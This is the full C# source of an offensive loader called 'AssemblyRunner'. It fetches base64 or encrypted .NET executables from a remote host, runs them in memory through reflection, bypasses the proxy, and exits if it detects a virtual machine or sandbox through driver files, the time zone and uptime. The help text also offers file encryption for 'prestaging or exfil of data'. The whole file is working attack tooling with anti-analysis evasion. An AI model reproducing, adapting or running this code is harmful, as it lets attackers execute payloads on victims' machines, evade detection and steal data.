using System;
using System.Collections.Generic;
using System.Text;
using System.Reflection;
using System.IO;
using System.Net;
using System.Diagnostics;


namespace AssemblyRunner
{
    public class Shared
    {
        public static void ExNoArgs(byte[] bee)
        {
            Assembly a = Assembly.Load(bee);
            MethodInfo method = a.EntryPoint;
            object o = a.CreateInstance(method.Name);
            method.Invoke(o, null);
        }

        public static void ExArgs(byte[] bee, string args1)
        {
            Assembly a = Assembly.Load(bee);
            MethodInfo method = a.EntryPoint;
            //a.EntryPoint.Invoke(null, new object[] { args1 });
            a.EntryPoint.Invoke(null, new object[] { new string[] { args1 } });
        }

        public static byte[] WebGet64(string fnewfile)
        {
            WebClient fclient = new WebClient();
            
            fclient.Proxy = null;            
            
            using (MemoryStream stream = new MemoryStream(fclient.DownloadData(fnewfile)))
            {
                var newstr = Encoding.ASCII.GetString(stream.ToArray());
                byte[] bee = System.Convert.FromBase64String(newstr);
                return bee;
            }
        }

        public static string WebGetEnc(string fnewfile, string password)
        {
            WebClient client = new WebClient();
            client.Proxy = null;            
            using (MemoryStream stream = new MemoryStream(client.DownloadData(fnewfile)))
            {
                var istream = Convert.ToBase64String(stream.ToArray());
                string encryptedstring = Crypt.Encrypt(istream, password);
                return encryptedstring;
            }
        }

        public static byte[] WebGetDec(string fnewfile, string password)
        {
            WebClient client = new WebClient();
            WebProxy proxy = new WebProxy();
            string[] byp = fnewfile.Split('/');
            string bypip = byp[2];
            List<string> bypasslist = new List<string>(proxy.BypassList);
            bypasslist.Add(bypip);
            proxy.BypassList = bypasslist.ToArray();
            using (MemoryStream stream = new MemoryStream(client.DownloadData(fnewfile)))
            {
                var newstr = Encoding.ASCII.GetString(stream.ToArray());

                string decryptedstring = Crypt.Decrypt(newstr, password);
                byte[] bytes = Convert.FromBase64String(decryptedstring);
                return bytes;
            }
        }

        public static bool SBOX()
        {
            bool sbox = false;
            List<string> EOfS = new List<string>();
            string[] FilePaths = {@"C:\windows\Sysnative\Drivers\Vmmouse.sys",
            @"C:\windows\Sysnative\Drivers\vm3dgl.dll", @"C:\windows\Sysnative\Drivers\vmdum.dll",
            @"C:\windows\Sysnative\Drivers\vm3dver.dll", @"C:\windows\Sysnative\Drivers\vmtray.dll",
            @"C:\windows\Sysnative\Drivers\vmci.sys", @"C:\windows\Sysnative\Drivers\vmusbmouse.sys",
            @"C:\windows\Sysnative\Drivers\vmx_svga.sys", @"C:\windows\Sysnative\Drivers\vmxnet.sys",
            @"C:\windows\Sysnative\Drivers\VMToolsHook.dll", @"C:\windows\Sysnative\Drivers\vmhgfs.dll",
            @"C:\windows\Sysnative\Drivers\vmmousever.dll", @"C:\windows\Sysnative\Drivers\vmGuestLib.dll",
            @"C:\windows\Sysnative\Drivers\VmGuestLibJava.dll", @"C:\windows\Sysnative\Drivers\vmscsi.sys",
            @"C:\windows\Sysnative\Drivers\VBoxMouse.sys", @"C:\windows\Sysnative\Drivers\VBoxGuest.sys",
            @"C:\windows\Sysnative\Drivers\VBoxSF.sys", @"C:\windows\Sysnative\Drivers\VBoxVideo.sys",
            @"C:\windows\Sysnative\vboxdisp.dll", @"C:\windows\Sysnative\vboxhook.dll",
            @"C:\windows\Sysnative\vboxmrxnp.dll", @"C:\windows\Sysnative\vboxogl.dll",
            @"C:\windows\Sysnative\vboxoglarrayspu.dll", @"C:\windows\Sysnative\vboxoglcrutil.dll",
            @"C:\windows\Sysnative\vboxoglerrorspu.dll", @"C:\windows\Sysnative\vboxoglfeedbackspu.dll",
            @"C:\windows\Sysnative\vboxoglpackspu.dll", @"C:\windows\Sysnative\vboxoglpassthroughspu.dll",
            @"C:\windows\Sysnative\vboxservice.exe", @"C:\windows\Sysnative\vboxtray.exe",
            @"C:\windows\Sysnative\VBoxControl.exe"};
            foreach (string FilePath in FilePaths)
            {
                if (File.Exists(FilePath))
                {
                    EOfS.Add(FilePath);
                }
            }
            int test = EOfS.Count;
            if (TimeZone.CurrentTimeZone.StandardName == "Coordinated Universal Time")
            {   
                test += 1; 
            }

            PerformanceCounter pc = new PerformanceCounter("System", "System Up Time");
            pc.NextValue();
            int uptime = (int)pc.NextValue();

            if (uptime / 3600 < 1)
            {
                test += 1;
            }

            if (test >= 1 || EOfS.Count >=1)
            {
                sbox = true;
            }


            return sbox;
        }
    }

    class Program
    {
        

        static void Main(string[] args)
        {
            bool stest = Shared.SBOX();
            if (stest == true)
            {
                Console.WriteLine("Ahh, Ahh, Ahh, you didnt say the magic word");
                return;
            }
            if (args.Length < 2 || args.Length > 4)
            {
                Console.WriteLine("");
                Console.WriteLine(".Net Exe Run in-memory with Arguments: ");
                Console.WriteLine("--Run remote .net exe (remote exe is b64 no encryption)");
                Console.WriteLine(System.AppDomain.CurrentDomain.FriendlyName + " -net http://IP/File(b64)" + " \"Arguments\"");
                Console.WriteLine("--Local .net exe File decrypt and run");
                Console.WriteLine(System.AppDomain.CurrentDomain.FriendlyName + " -rlocal" + " PASSWORD" + " File_to_Decrypt_and_run \"Arguments\"");
                Console.WriteLine("--Remote .net File decrypt and run");
                Console.WriteLine(System.AppDomain.CurrentDomain.FriendlyName + " -rdec" + " PASSWORD" + " http://IP/File" + " \"Arguments\"");
                Console.WriteLine(" ");
                Console.WriteLine(" ");
                Console.WriteLine(".Net Exe Run in-memory without Arguments: ");
                Console.WriteLine("--Run remote .net exe (remote exe is b64 no encryption)");
                Console.WriteLine(System.AppDomain.CurrentDomain.FriendlyName + " -netno http://IP/File(b64)");
                Console.WriteLine("--Local .net exe File decrypt and run");
                Console.WriteLine(System.AppDomain.CurrentDomain.FriendlyName + " -rlocalno" + " PASSWORD" + " File_to_Decrypt_and_run");
                Console.WriteLine("--Remote .net File decrypt and run");
                Console.WriteLine(System.AppDomain.CurrentDomain.FriendlyName + " -rdecno" + " PASSWORD" + " http://IP/File");
                Console.WriteLine(" ");
                Console.WriteLine(" ");
                Console.WriteLine("File Encryption only: ");
                Console.WriteLine("--Encrypt Remote exe and download local, saved as encrypt_remote.txt");
                Console.WriteLine(System.AppDomain.CurrentDomain.FriendlyName + " -enc" + " PASSWORD" + " http://IP/File");
                Console.WriteLine("--Encrypt Local File, used for prestaging or exfil of data, saved as encrypt_local.txt");
                Console.WriteLine(System.AppDomain.CurrentDomain.FriendlyName + " -file" + " PASSWORD" + " FILE/TO/ENC");
                Console.WriteLine("--Local File Decrypt for exfil, not on target system, file saved as decrypted.txt");
                Console.WriteLine(System.AppDomain.CurrentDomain.FriendlyName + " -decfile" + " PASSWORD" + " File_to_Decrypt");
                Console.WriteLine(" ");
                
                
            }

            if (args.Length == 2)
            {
                if (args[0] == "-netno")
                {
                    string weburl = args[1];
                    byte[] retWG = Shared.WebGet64(weburl);
                    Shared.ExNoArgs(retWG);
                }
            }
            if (args.Length == 3)
            {
                if (args[0] == "-net")
                {
                    string weburl = args[1];
                    string argsExe = args[2];
                    
                    byte[] retWG = Shared.WebGet64(weburl);

                    Shared.ExArgs(retWG, argsExe);
                }
                if (args[0] == "-file")
                {
                    Console.WriteLine("-file detected, will attempt local file enc, saved as encrypt_local.txt");
                    string password = args[1];
                    string newfile = args[2];
                    Byte[] bytes = File.ReadAllBytes(newfile);
                    string filestring = Convert.ToBase64String(bytes);
                    string encryptedstring = Crypt.Encrypt(filestring, password);
                    System.IO.File.WriteAllText(@"encrypt_local.txt", encryptedstring);

                }
                if (args[0] == "-enc")
                {
                    Console.WriteLine("-enc detected, will attempt remote file enc");
                    string password = args[1];
                    string newfile = args[2];
                    string encryptedstring = Shared.WebGetEnc(newfile, password);
                    System.IO.File.WriteAllText(@"encrypt_remote.txt", encryptedstring);
                }
                if (args[0] == "-decfile")
                {
                    Console.WriteLine("-decfile detected, will attempt local file decrpytion, file saved as decrypted.txt");
                    string password = args[1];
                    string newfile = args[2];
                    string fcontents = File.ReadAllText(@newfile);
                    string decryptedstring = Crypt.Decrypt(fcontents, password);
                    Byte[] bytes = Convert.FromBase64String(decryptedstring);
                    System.IO.File.WriteAllBytes("decryptedstring.txt", bytes);
                }
                if (args[0] == "-rlocalno")
                {
                    Console.WriteLine("-rlocalno detected with attempt local decrypt and run");
                    string password = args[1];
                    string newfile = args[2];
                    string fcontents = File.ReadAllText(@newfile);
                    string decryptedstring = Crypt.Decrypt(fcontents, password);
                    Byte[] bytes = Convert.FromBase64String(decryptedstring);
                    Assembly a = Assembly.Load(bytes);
                    MethodInfo method = a.EntryPoint;
                    object o = a.CreateInstance(method.Name);
                    method.Invoke(o, null);
                }
                if (args[0] == "-rdecno")
                {
                    Console.WriteLine("-rdecno detected will attempt remote file dec and run in memory");
                    string password = args[1];
                    string newfile = args[2];
                    byte[] bytes = Shared.WebGetDec(newfile, password);
                    Shared.ExNoArgs(bytes);
                }
            }

            if (args.Length == 4)
            {
                if (args[0] == "-rdec")
                {
                    Console.WriteLine("-rdec detected will attempt remote file dec and run in memory");
                    string password = args[1];
                    string newfile = args[2];
                    string argsExe = args[3];
                    byte[] bytes = Shared.WebGetDec(newfile, password);
                    Shared.ExArgs(bytes, argsExe);
                }
                if (args[0] == "-rlocal")
                {
                    Console.WriteLine("-rlocal detected will attempt local decrypt and run");
                    string password = args[1];
                    string newfile = args[2];
                    string argsExe = args[3];
                    string fcontents = File.ReadAllText(@newfile);
                    string decryptedstring = Crypt.Decrypt(fcontents, password);
                    Byte[] bytes = Convert.FromBase64String(decryptedstring);
                    Shared.ExArgs(bytes, argsExe);


                }
            }
         }
    }
}
 
 
